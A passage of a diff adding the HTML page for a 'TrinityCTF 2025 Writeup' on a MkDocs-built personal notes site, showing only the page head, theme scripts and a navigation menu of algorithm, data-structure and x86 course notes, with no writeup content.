@@ -1,0 +1,4673 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../-re/Exploration-of-ICSPA-submit/">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>TrinityCTF 2025 Writeup - CSNote</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.618322db.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css">
+    
+      <link rel="stylesheet" href="https://fonts.loli.net/css?family=JetBrains Mono:400,500,600,700&amp;display=swap">
+    
+      <link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-webfont/1.6.0/lxgwwenkai-regular.css">
+    
+      <link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-webfont/1.6.0/lxgwwenkaimono-bold.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/fonts/material-icons.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/backdrop.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/light.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/material.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/scale.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/shift-away.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/tippy.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/core/core.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/user.config.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#trinityctf-2025-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="CSNote" class="md-header__button md-logo" aria-label="CSNote" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CSNote
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              TrinityCTF 2025 Writeup
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple" aria-label="Switch to system preference" type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Nopthon/csnotes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"></path></svg>
+  </div>
+  <div class="md-source__repository">
+    CSNote repo
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  intro
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../OI-Learning/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  OI-learning
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../course-notes/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Course Notes
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="CSNote" class="md-nav__button md-logo" aria-label="CSNote" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+
+    </a>
+    CSNote
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Nopthon/csnotes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"></path></svg>
+  </div>
+  <div class="md-source__repository">
+    CSNote repo
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    intro
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../OI-Learning/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OI-learning
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OI-learning
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/C%2B%2B%20OOP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C++ 面向对象
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3">
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Algorithm
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Algorithm
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Algorithm/STL_algorithm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    STL 算法库 ref
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Algorithm/fastpow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    快速幂
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4">
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Structure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Data Structure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_1">
+        
+          
+          <label class="md-nav__link" for="__nav_2_4_1" id="__nav_2_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Trees
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Trees
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/Tree/tree-intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    树基础
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/Tree/binatree/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    二叉树基础
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/Tree/binatree-template/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    二叉树模板
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_2">
+        
+          
+          <label class="md-nav__link" for="__nav_2_4_2" id="__nav_2_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Graphs
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Graphs
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/Graph/union-find/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    并查集
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/linkedlist/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    链表
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/vector/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    STL vector ref
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/stack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    栈 &amp;&amp; 单调栈
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/queue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    队列 &amp;&amp; 单调队列
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/hashmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    散列表/哈希表
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../course-notes/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Course Notes
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Course Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../course-notes/ICSPA-x86/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ICSPA x86 note
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ICSPA x86 note
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA0
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA2-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA2-1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/i386/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    i386 指令结构 for PA2-1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA2-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA2-2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA2-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA2-3
+  
+
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--encrypted"></span>
+  
+
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/Before_PA3_%26%26_4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Before PA3&amp;&amp;4
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA3-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA3-1
+  
+
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--encrypted"></span>
+  
+
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA3-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA3-2
+  
+
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--encrypted"></span>
+  
+
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../course-notes/ICSPA-x86/PA3-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PA3-3
+  
+
+    
+  </span>
+  
+    
+  
+  
